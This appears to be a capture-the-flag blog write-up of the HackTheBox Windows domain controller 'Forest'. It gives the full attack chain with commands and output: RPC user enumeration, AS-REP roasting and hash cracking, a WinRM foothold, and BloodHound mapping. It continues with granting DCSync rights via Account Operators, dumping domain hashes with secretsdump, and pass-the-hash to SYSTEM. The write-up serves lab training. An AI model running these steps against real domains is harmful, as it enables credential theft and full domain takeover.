
---
title: "Forest"
summary: "Forest in an easy difficulty Windows Domain Controller, for a domain in which Exchange Server has been installed. The foothoold can be obtained via AS-REP Roasting. The service account is found to be a member of the Account Operators group, which can be used to add users to later exploit DCSync privileges."
categories: ["Post","Blog",]
tags: ["post","hackthebox","windows"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2025-01-11

---

| Machine Info         |              |
| -------------------- | ------------ |
| **Platform**         | HackTheBox   |
| **Operative System** | Windows      |
| **Difficulty**       | Easy         |
| **IP**               | 10.10.10.161 |
- - -
## Enumeration
As always, we start with `Nmap`:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nmap -p53,88,135,139,445,464,493,636,3268,3269,5985,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.161 -oN ports

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-08 17:29:54Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?
493/tcp   closed ticf-2
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-08T17:30:01
|_  start_date: 2025-01-08T17:19:43
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-01-08T09:30:03-08:00
|_clock-skew: mean: 2h46m49s, deviation: 4h37m10s, median: 6m48s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

```

We have quite a few open ports. Let's begin exploring each:

## RPC
We can connect with a null session to RPC to query for info such as _domain users_:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ rpcclient -U '' -N 10.10.10.161

rpcclient $> enumdomusers

user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

We find some users. Is a good practice to save all the useful information that we find, so I will create a _users.txt_ file that would help us in the future for attacks like password sprays.

>A Password Spray attack consists of attempting a password across multiple user accounts within an organization, rather than targeting a single account with multiple attempts, thereby avoiding lockout mechanisms.

After enumerating a bit, I find that the user _svc-alfresco_ has the `Do not require Kerberos preauthentication` option enabled. Let's check this.

## AS-Rep Roasting
An **AS-REP Roasting** attack targets user accounts in Active Directory that have the `Do not require Kerberos preauthentication` flag enabled. Attackers request a Kerberos AS-REP ticket for these accounts, which is returned encrypted with the user’s NTLM hash. Then, we can brute-force the hash offline to retrieve the plaintext password with a tool such as `hashcat`.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo impacket-GetNPUsers -request -dc-ip 10.10.10.161 htb.local/

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2025-01-08 07:40:04.738225  2025-01-08 07:40:01.956933  0x410200 

$krb5asrep$23$svc-alfresco@HTB.LOCAL:44ad01dc17d4ba761d72ea7545970dcd$7806253f36fd17dd6d9669037ace47695e502faace5fa4e2409a727613d40d083db43a8f229c3feb8968f8a48fef57d4f71f526f19d66345e6662e3563756a92e9717357312ae3c7e0d16e6fe092b09b698fbd64a5e91d9b566f1d15c3dfeaad0f1eb7e6a73d8c8ea75aaad258df47071858092fde8b9eb2c649c30fcfe30f318da1196a789d4c915e4d5e63c876d73ffaa6ff568adab010d87586ec32cc8f023a824b922b192eb0d40db2efe04dc1450e297fadfbc46f452458810d0bcffbd33933e2b1d2039332d4953ac955fb4c27c61df64c039eb88c502e0be28a47a71fadca23864fdd
```

Let's crack the hash:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show

$krb5asrep$23$svc-alfresco@HTB.LOCAL:44ad01dc17d4ba761d72ea7545970dcd$7806253f36fd17dd6d9669037ace47695e502faace5fa4e2409a727613d40d083db43a8f229c3feb8968f8a48fef57d4f71f526f19d66345e6662e3563756a92e9717357312ae3c7e0d16e6fe092b09b698fbd64a5e91d9b566f1d15c3dfeaad0f1eb7e6a73d8c8ea75aaad258df47071858092fde8b9eb2c649c30fcfe30f318da1196a789d4c915e4d5e63c876d73ffaa6ff568adab010d87586ec32cc8f023a824b922b192eb0d40db2efe04dc1450e297fadfbc46f452458810d0bcffbd33933e2b1d2039332d4953ac955fb4c27c61df64c039eb88c502e0be28a47a71fadca23864fdd:s3rvice
```

Now that we have the credentials **svc-alfresco:s3rvice**, we can try to access the machine via WinRM with a tool like `evil-winrm`.

- - -
## Setting a Foothold
We can access the machine abusing the **WinRM** protocol with `evil-winrm`, taking advantage of the credentials we just found.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice       

Evil-WinRM shell v3.7
Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> whoami
htb\svc-alfresco
```

Nice! We are inside the system. We can now claim the _user flag_.

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
2bc3959f6...f9382ed94
```

- - -
## Privilege Escalation
Now that we are inside the machine as a low-privileged user, we want to take control over the Administrator account in order to root the **Domain Controller**.

We can map out the Domain objects with **BloodHound**. Take a look at my [BloodHound](https://s3ntinl.github.io/posts/bloodhound/) post where we discuss how to do a quick installation and start using it if you haven't already! 

First, we need to recolect the information with **SharpHound**, so after uploading it to the machine, we do the following:

```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> powershell -ep bypass

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> import-module ./SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\svc-alfresco\Desktop\ -OutputPrefix "forest"
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         1/8/2025   1:47 PM          44043 forest_20250108134756_BloodHound.zip
```

We have already pwned **svc-alfresco**, so we need to focus on how can we use this user to elevate our privileges. Next, we import the zip to **BloodHound** and let's a look. 

![forest1](/img/forest/forest1.png)

As we can see, this user is a member of **Account Operators**, a pretty powerful group. [Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) says the following:

>The _Account Operators_ group grants limited account creation privileges to a user. Members of this group can **create** and **modify** most types of accounts, including accounts for users, Local groups, and Global groups. Group members can log in locally to domain controllers.

>Members of the _Account Operators_ group can't manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group can't modify user rights.

Let's try the _Shortest paths to Domain Admins_ query:

![forest2](/img/forest/forest2.png)

Which shows the following:

![forest3](/img/forest/forest3.png)

As we are a member of the _Account Operators_, we can create a user in the _Exchange Windows Permissions_ Group to abuse the **WriteDacl** permission that this group has over the entire domain.

With **WriteDacl** we can do attacks such as **DCSync**. Let's go step by step:

1. We create the user **s3ntinl** and add it to the _Exchange Windows Permissions_ Group.
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net user s3ntinl s3ntinl123! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> net group "Exchange Windows Permissions" s3ntinl /add
The command completed successfully.
```

2. Grant DCSync Privileges to **s3ntinl**:
> Remember to import **powerview.ps1** if you haven't already
```powershell
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $SecPassword = ConvertTo-SecureString 's3ntinl123!' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\s3ntinl', $SecPassword)

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> import-module ./powerview.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity s3ntinl -Rights DCSync
```

3. Abuse the **DCSync** with `impacket-secretsdump`:

```bash
┌──(s3n㉿kali)-[/opt/tools]
└─$ sudo impacket-secretsdump 'htb.local'/'s3ntinl':'s3ntinl123!'@'10.10.10.161'

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::

...

[*] Cleaning up... 
```

Nice! We managed to dump all the hashes. Now we can abuse SMB with `impacket-psexec` and do a PassTheHash.

>In a PtH attack, an attacker uses the NTLM hash of a user’s password to authenticate without knowing the actual password.
PsExec supports this by leveraging Windows’ ability to authenticate via NTLM hashes when interacting with services like SMB.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
...

C:\Windows\system32> whoami
nt authority\system

```

Great! Let's read the root flag and we can consider **Forest** as pwned!

```powershell
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
767c4284...1c365ef6
```